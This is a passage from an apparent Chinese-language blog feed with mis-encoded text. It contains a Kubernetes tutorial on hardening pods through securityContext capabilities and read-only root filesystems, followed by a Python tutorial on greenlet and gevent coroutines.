class="line">ram5</span><br><span class="line">tty11</span><br><span class="line">tty12</span><br><span class="line">tty13</span><br><span class="line">tty14</span><br><span class="line">tty15</span><br><span class="line">tty16</span><br><span class="line">tty17</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="ä¸ºå®¹å™¨å•ç‹¬æ·»åŠ å†…æ ¸åŠŸèƒ½"><a href="#ä¸ºå®¹å™¨å•ç‹¬æ·»åŠ å†…æ ¸åŠŸèƒ½" class="headerlink" title="ä¸ºå®¹å™¨å•ç‹¬æ·»åŠ å†…æ ¸åŠŸèƒ½"></a>ä¸ºå®¹å™¨å•ç‹¬æ·»åŠ å†…æ ¸åŠŸèƒ½</h5><p>ç›¸æ¯”äºè®©å®¹å™¨è¿è¡Œåœ¨ç‰¹æƒæ¨¡å¼ä¸‹ä»¥ç»™äºˆå…¶æ— é™çš„æƒé™ï¼Œä¸€ä¸ªæ›´å®‰å…¨çš„åšæ³•æ˜¯åªç»™äºˆå®ƒæ˜¯ç”¨çœŸæ­£éœ€è¦çš„å†…æ ¸åŠŸèƒ½çš„æƒé™ï¼ŒKuberneteså…è®¸ä¸ºç‰¹å®šçš„å®¹å™¨æ·»åŠ å†…æ ¸åŠŸèƒ½ï¼Œæˆ–ç¦ç”¨éƒ¨åˆ†å†…æ ¸åŠŸèƒ½ï¼Œä»¥å…è®¸å¯¹å®¹å™¨è¿›è¡Œæ›´åŠ ç²¾ç»†çš„æƒé™æ§åˆ¶ï¼Œä»è€Œé™åˆ¶æ”»å‡»ä¹‹æ¶æ½œåœ¨ä¾µå…¥çš„ä¸€äº›å½±å“ã€‚</p><p>ä¾‹å¦‚ï¼Œä¸€ä¸ªå®¹å™¨é€šå¸¸ä¸å…è®¸ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹åä¸º<code>pod-with-defaults</code>çš„podä¸­çš„æ—¶é—´æ¥éªŒè¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- date +%T -s "12:00:00"</span><br><span class="line">date: can't set date: Operation not permitted</span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦å…è®¸å®¹å™¨ä¿®æ”¹ç³»ç»Ÿæ—¶é—´ï¼Œå¯ä»¥åœ¨å®¹å™¨çš„<code>securityContext.capabilities</code>é‡Œaddä¸€é¡¹åä¸º<code>CAP_SYS_TIME</code>çš„åŠŸèƒ½ã€‚</p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªåä¸º<code>pod-add-settime-capability</code>çš„YAMLæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-add-settime-capability</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">capabilities:</span></span><br><span class="line">        <span class="attr">add:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">SYS_TIME</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„Linuxå†…æ ¸åŠŸèƒ½çš„åç§°é€šå¸¸ä»¥<code>CAP_</code>å¼€å¤´ï¼Œä½†æ˜¯åœ¨<code>pod spec</code>ä¸­æŒ‡å®šå†…æ ¸åŠŸèƒ½æ—¶ï¼Œå¿…é¡»çœç•¥<code>CAP_</code>å‰ç¼€</p><p>å¯åŠ¨å¥½podä¹‹åï¼Œåœ¨æ–°çš„å®¹å™¨ä¸­è¿è¡ŒåŒæ ·çš„å‘½ä»¤ï¼Œå‘ç°å¯ä»¥æˆåŠŸä¿®æ”¹ç³»ç»Ÿæ—¶é—´</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-add-settime-capability -- date +%T -s "12:00:00" </span><br><span class="line">12:00:00</span><br><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-add-settime-capability -- date                  </span><br><span class="line">Tue Oct 26 12:00:05 UTC 2021</span><br></pre></td></tr></table></figure><h5 id="åœ¨å®¹å™¨ä¸­ç¦ç”¨å†…æ ¸åŠŸèƒ½"><a href="#åœ¨å®¹å™¨ä¸­ç¦ç”¨å†…æ ¸åŠŸèƒ½" class="headerlink" title="åœ¨å®¹å™¨ä¸­ç¦ç”¨å†…æ ¸åŠŸèƒ½"></a>åœ¨å®¹å™¨ä¸­ç¦ç”¨å†…æ ¸åŠŸèƒ½</h5><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå®¹å™¨æ‹¥æœ‰<code>CAP_CHOWN</code>æƒé™ï¼Œå…è®¸è¿›ç¨‹ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶çš„æ‰€æœ‰è€…ã€‚å¦‚ä¸‹ç¤ºä¾‹ï¼Œå¯ä»¥åœ¨<code>pod-with-defaults</code>ä¸­å°†<code>/tmp</code>ç›®å½•çš„æ‰€æœ‰è€…æ”¹ä¸ºguestç”¨æˆ·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- chown guest /tmp</span><br><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- ls -la / | grep tmp</span><br><span class="line">drwxrwxrwt    1 guest    root          4096 Aug 27 11:05 tmp</span><br></pre></td></tr></table></figure><p>ä¸ºäº†é˜»æ­¢å®¹å™¨çš„è¿™ç§è¡Œä¸ºï¼Œå¯ä»¥åœ¨å®¹å™¨çš„<code>securityContext.capabilities</code>é‡Œdropä¸€é¡¹åä¸º<code>CHOWN</code>çš„åŠŸèƒ½</p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªåä¸º<code>pod-drop-chown-capability</code>çš„YAMLæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-drop-chown-capability</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">capabilities:</span></span><br><span class="line">        <span class="attr">drop:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">CHOWN</span></span><br></pre></td></tr></table></figure><p>ç¦ç”¨<code>CHOWN</code>å†…æ ¸åŠŸèƒ½åï¼Œåˆ™ä¸å…è®¸åœ¨è¿™ä¸ªpodä¸­ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-drop-chown-capability -- chown guest /tmp</span><br><span class="line">chown: /tmp: Operation not permitted</span><br><span class="line">command terminated with exit code 1</span><br></pre></td></tr></table></figure><h5 id="é˜»æ­¢å¯¹å®¹å™¨æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å†™å…¥"><a href="#é˜»æ­¢å¯¹å®¹å™¨æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å†™å…¥" class="headerlink" title="é˜»æ­¢å¯¹å®¹å™¨æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å†™å…¥"></a>é˜»æ­¢å¯¹å®¹å™¨æ ¹æ–‡ä»¶ç³»ç»Ÿçš„å†™å…¥</h5><p>å› ä¸ºå®‰å…¨åŸå› ï¼Œå¯ä»¥éœ€è¦ç»„ç»‡å®¹å™¨ä¸­çš„è¿›ç¨‹å¯¹å®¹å™¨çš„æ ¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œå†™å…¥ï¼Œä»…å…è®¸ä»–ä»¬å†™å…¥æŒ‚è½½çš„å­˜å‚¨å·ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å®¹å™¨çš„<code>securityContext.readOnlyRootFilesystem</code>è®¾ç½®ä¸ºtrueæ¥å®ç°ã€‚</p><p>åˆ›å»ºä¸€ä¸ªåä¸º<code>pod-with-readonly-filesystem</code>çš„YAMLæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: pod-with-readonly-filesystem</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: main</span><br><span class="line">    image: alpine</span><br><span class="line">    command: ["/bin/sleep","999999"]</span><br><span class="line">    securityContext:</span><br><span class="line">      readOnlyRootFilesystem: true</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - name: my-volume</span><br><span class="line">      mountPath: /volume</span><br><span class="line">      readOnly: false</span><br><span class="line">  volumes:</span><br><span class="line">  - name: my-volume</span><br><span class="line">    emptyDir:</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpodä¸­çš„å®¹å™¨è™½ç„¶ä»¥rootç”¨æˆ·è¿è¡Œï¼Œæ‹¥æœ‰<code>/</code>ç›®å½•çš„å†™æƒé™ï¼Œä½†åœ¨è¯¥ç›®å½•ä¸‹å†™å…¥ä¸€ä¸ªæ–‡ä»¶ä¼šå¤±è´¥ï¼Œå¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-readonly-filesystem -- touch /new-file</span><br><span class="line">touch: /new-file: Read-only file system</span><br><span class="line">command terminated with exit code 1</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¯¹äºæŒ‚è½½çš„å·çš„å†™å…¥æ—¶å…è®¸çš„ï¼Œå¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-readonly-filesystem -- touch /volume/new-file</span><br><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-readonly-filesystem -- ls -la /volume/new-file</span><br><span class="line">-rw-r--r--    1 root     root             0 Oct 26 06:59 /volume/new-file</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;æœºåˆ¶è¯´æ˜&quot;&gt;&lt;a href=&quot;#æœºåˆ¶è¯´æ˜&quot; class=&quot;headerlink&quot; title=&quot;æœºåˆ¶è¯´æ˜&quot;&gt;&lt;/a&gt;æœºåˆ¶è¯´æ˜&lt;/h4&gt;&lt;p&gt;Kubernetesä½œä¸ºä¸€ä¸ªåˆ†å¸ƒå¼é›†ç¾¤çš„ç®¡ç†å·¥å…·ï¼Œä¿è¯é›†ç¾¤çš„å®‰å…¨æ€§æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„ä»»åŠ¡ï¼Œ&lt;code&gt;API Server&lt;/c
      
    
    </summary>
    
    
      <category term="Cloud Security" scheme="elssm.github.io/tags/Cloud-Security/"/>
    
  </entry>
  
  <entry>
    <title>Pythonåç¨‹</title>
    <link href="elssm.github.io/2021/10/24/Python%E5%8D%8F%E7%A8%8B/"/>
    <id>elssm.github.io/2021/10/24/Pythonåç¨‹/</id>
    <published>2021-10-24T03:56:55.000Z</published>
    <updated>2021-12-13T09:50:18.222Z</updated>
    
    <content type="html"><![CDATA[<h4 id="åç¨‹æ¦‚å¿µ"><a href="#åç¨‹æ¦‚å¿µ" class="headerlink" title="åç¨‹æ¦‚å¿µ"></a>åç¨‹æ¦‚å¿µ</h4><p>åç¨‹æ˜¯ä¸€ç§ç”¨æˆ·æ€çš„è½»é‡çº§çº¿ç¨‹ï¼Œåç¨‹çš„è°ƒåº¦å®Œå…¨ç”±ç”¨æˆ·æ§åˆ¶ã€‚åç¨‹æ‹¥æœ‰è‡ªå·±çš„å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆã€‚åç¨‹è°ƒåº¦åˆ‡æ¢æ—¶ï¼Œå°†å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆä¿å­˜åˆ°å…¶ä»–åœ°æ–¹ï¼Œåœ¨åˆ‡å›æ¥çš„æ—¶å€™ï¼Œæ¢å¤å…ˆå‰ä¿å­˜çš„å¯„å­˜å™¨ä¸Šä¸‹æ–‡å’Œæ ˆï¼Œç›´æ¥æ“ä½œæ ˆåˆ™åŸºæœ¬æ²¡æœ‰å†…æ ¸åˆ‡æ¢çš„å¼€é”€ï¼Œå¯ä»¥ä¸åŠ é”çš„è®¿é—®å…¨å±€å˜é‡ï¼Œæ‰€ä»¥ä¸Šä¸‹æ–‡çš„åˆ‡æ¢éå¸¸å¿«ã€‚ä¸çº¿ç¨‹ç›¸æ¯”ï¼Œåç¨‹æ›´è½»é‡ã€‚ä¸€ä¸ªPythonçº¿ç¨‹å¤§æ¦‚å ç”¨8Må†…å­˜ï¼Œè€Œä¸€ä¸ªåç¨‹åªå ç”¨1KBä¸åˆ°å†…å­˜ã€‚åç¨‹æ›´é€‚ç”¨äºIOå¯†é›†å‹çš„åº”ç”¨ã€‚</p><h4 id="greenletæ¨¡å—"><a href="#greenletæ¨¡å—" class="headerlink" title="greenletæ¨¡å—"></a>greenletæ¨¡å—</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> greenlet <span class="keyword">import</span> greenlet</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    g2.switch()</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line">    g1.switch()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g1 = greenlet(eat)</span><br><span class="line">g2 = greenlet(sleep)</span><br><span class="line">g1.switch()</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œåˆ›å»ºäº†ä¸¤ä¸ªåç¨‹å¯¹è±¡ï¼Œåˆ†åˆ«æ˜¯<code>g1</code>å’Œ<code>g2</code>ï¼Œåˆ†åˆ«å¯¹åº”çš„æ˜¯<code>eat()å‡½æ•°</code>å’Œ<code>sleep()</code>å‡½æ•°ã€‚é€šè¿‡ä½¿ç”¨<code>greenlet</code>çš„<code>switch</code>æ–¹æ³•å¯ä»¥åˆ‡æ¢åç¨‹ã€‚è¿™é‡Œæˆ‘ä»¬å…ˆè°ƒç”¨<code>g1</code>çš„<code>switchæ–¹æ³•</code>ï¼Œæ­¤æ—¶<code>eat()</code>å‡½æ•°è¢«æ‰§è¡Œï¼Œå¹¶æ‰“å°å‡º<code>start eating</code>ã€‚æ¥ä¸‹æ¥æ˜¯<code>g2</code>çš„<code>switchæ–¹æ³•</code>è¢«è°ƒç”¨ï¼Œæ­¤æ—¶æ‰§è¡Œ<code>sleep()</code>å‡½æ•°ï¼Œä¾æ¬¡æ‰“å°<code>start sleeping</code>å’Œ<code>finished sleeping</code>ï¼Œä¹‹ååˆè°ƒç”¨äº†<code>g1</code>çš„<code>switchæ–¹æ³•</code>ï¼Œå›åˆ°<code>eat()å‡½æ•°ä¸­</code>ï¼Œæ‰“å°å‡º<code>finished eating</code>ã€‚ç¨‹åºæ‰§è¡Œç»“æŸã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å®Œæˆäº†ä¸¤ä¸ªåç¨‹ä¹‹é—´çš„åˆ‡æ¢ã€‚ä»£ç çš„è¾“å‡ºä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br><span class="line">finished eating</span><br></pre></td></tr></table></figure><h4 id="geventæ¨¡å—"><a href="#geventæ¨¡å—" class="headerlink" title="geventæ¨¡å—"></a>geventæ¨¡å—</h4><p>geventæ˜¯ç¬¬ä¸‰æ–¹åº“ï¼Œé€šè¿‡greenletå®ç°åç¨‹ã€‚ç„¶è€Œå½“ä¸€ä¸ªgreenleté‡åˆ°IOæ“ä½œæ—¶ï¼Œæ¯”å¦‚è®¿é—®ç½‘ç»œï¼Œå°±è‡ªåŠ¨åˆ‡æ¢åˆ°å…¶ä»–çš„greenletï¼Œç­‰åˆ°IOæ“ä½œå®Œæˆï¼Œå†åœ¨é€‚å½“çš„æ—¶å€™åˆ‡æ¢å›æ¥ç»§ç»­æ‰§è¡Œã€‚ç”±äºIOæ“ä½œéå¸¸è€—æ—¶ï¼Œç»å¸¸ä½¿ç¨‹åºå¤„äºç­‰å¾…çŠ¶æ€ï¼Œæœ‰äº†geventä¸ºæˆ‘ä»¬è‡ªåŠ¨åˆ‡æ¢åç¨‹ï¼Œå°±ä¿è¯æ€»æœ‰greenletåœ¨è¿è¡Œï¼Œè€Œä¸æ˜¯ç­‰å¾…IOã€‚</p><h5 id="åˆ›å»ºåç¨‹ä»»åŠ¡"><a href="#åˆ›å»ºåç¨‹ä»»åŠ¡" class="headerlink" title="åˆ›å»ºåç¨‹ä»»åŠ¡"></a>åˆ›å»ºåç¨‹ä»»åŠ¡</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  <span class="comment"># åˆ›é€ ä¸€ä¸ªåç¨‹ä»»åŠ¡</span></span><br><span class="line">gevent.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>åœ¨<code>gevent</code>æ¨¡å—ä¸­ï¼Œé€šè¿‡<code>gevent.spawn</code>å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªåç¨‹ä»»åŠ¡ã€‚å¦‚æœéœ€è¦äº¤æ›¿ä¹‹è¡Œçš„è¯ï¼Œéœ€è¦ä½¿ç”¨<code>gevent.sleep</code>äº¤å‡ºæ§åˆ¶æƒã€‚è¿™ä¸ªæ—¶å€™ï¼Œå°±ä¼šè½¬å»æ‰§è¡Œ<code>eat</code>å‡½æ•°ã€‚</p><h5 id="é˜»å¡ç­‰å¾…åç¨‹å®Œæˆ"><a href="#é˜»å¡ç­‰å¾…åç¨‹å®Œæˆ" class="headerlink" title="é˜»å¡ç­‰å¾…åç¨‹å®Œæˆ"></a>é˜»å¡ç­‰å¾…åç¨‹å®Œæˆ</h5><p>ä½¿ç”¨<code>join</code>æ–¹æ³•ï¼Œå¯ä»¥é˜»å¡ç­‰å¾…ä¸€ä¸ªåç¨‹çš„ç»“æŸã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  </span><br><span class="line">g1.join()</span><br></pre></td></tr></table></figure><h5 id="é˜»å¡ç­‰å¾…å¤šä¸ªåç¨‹"><a href="#é˜»å¡ç­‰å¾…å¤šä¸ªåç¨‹" class="headerlink" title="é˜»å¡ç­‰å¾…å¤šä¸ªåç¨‹"></a>é˜»å¡ç­‰å¾…å¤šä¸ªåç¨‹</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    gevent.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    gevent.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)  </span><br><span class="line">g2 = gevent.spawn(sleep)</span><br><span class="line">g1.join()</span><br><span class="line">g2.join()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„åœ¨å¤šä¸ªåç¨‹ä¸­ï¼Œä¸èƒ½ä½¿ç”¨<code>time.sleep</code>ï¼Œè¿™æ ·å°†ä¼šå¯¼è‡´åç¨‹æ˜¯åŒæ­¥æ‰§è¡Œçš„ã€‚è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">finished eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br></pre></td></tr></table></figure><p>å› æ­¤éœ€è¦ä½¿ç”¨<code>gevent.sleep</code>ï¼Œè¿™æ ·æ‰èƒ½å¼•èµ·åç¨‹ä¹‹é—´çš„åˆ‡æ¢ã€‚è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start eating</span><br><span class="line">start sleeping</span><br><span class="line">finished sleeping</span><br><span class="line">finished eating</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œå¯¹äºå¤šä¸ªåç¨‹çš„é˜»å¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸ç”¨å¯¹äºæ¯ä¸€ä¸ªåç¨‹é‡‡ç”¨<code>join</code>æ–¹æ³•ï¼Œ åœ¨<code>gevent</code>ä¸­æä¾›äº†<code>joinall</code>æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­ï¼Œåªéœ€è¦ä¼ ä¸€ä¸ªåç¨‹çš„åˆ—è¡¨å³å¯ï¼Œå› æ­¤å¯¹äºä¸Šé¢ä»£ç æœ€åä¸¤è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢ä»£ç æ›¿æ¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gevent.joinall([g1,g2])</span><br></pre></td></tr></table></figure><h5 id="geventä¸­çš„monkeyæ¨¡å—"><a href="#geventä¸­çš„monkeyæ¨¡å—" class="headerlink" title="geventä¸­çš„monkeyæ¨¡å—"></a>geventä¸­çš„monkeyæ¨¡å—</h5><p>monkeyæ¨¡å—å¯ä»¥ä½¿æˆ‘ä»¬åœ¨ä¸ä¿®æ”¹åŸæ¥ä½¿ç”¨çš„pythonæ ‡å‡†åº“å‡½æ•°çš„ç¨‹åºçš„æƒ…å†µä¸‹ï¼Œå°†ç¨‹åºè½¬æ¢æˆå¯ä»¥ä½¿ç”¨geventæ¡†æ¶çš„å¼‚æ­¥ç¨‹åºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start eating"</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"finished eating"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleep</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"start sleeping"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"finished sleeping"</span>)</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(eat)</span><br><span class="line">g2 = gevent.spawn(sleep)</span><br><span class="line">gevent.joinall([g1, g2])</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åªéœ€è¦ä»<code>gevent</code>ä¸­å¯¼å…¥<code>monkey</code>ã€‚å¹¶åŠ ä¸Š<code>monkey.patch_all()</code>ã€‚è¿™æ ·å¯¹äºä»£ç ä¸­çš„è€—æ—¶æ“ä½œï¼Œå°±ä¼šè½¬æ¢ä¸º<code>gevent</code>ä¸­å®ç°çš„æ¨¡å—ã€‚</p><h5 id="åŒæ—¶èµ·å¤šä¸ªåç¨‹"><a href="#åŒæ—¶èµ·å¤šä¸ªåç¨‹" 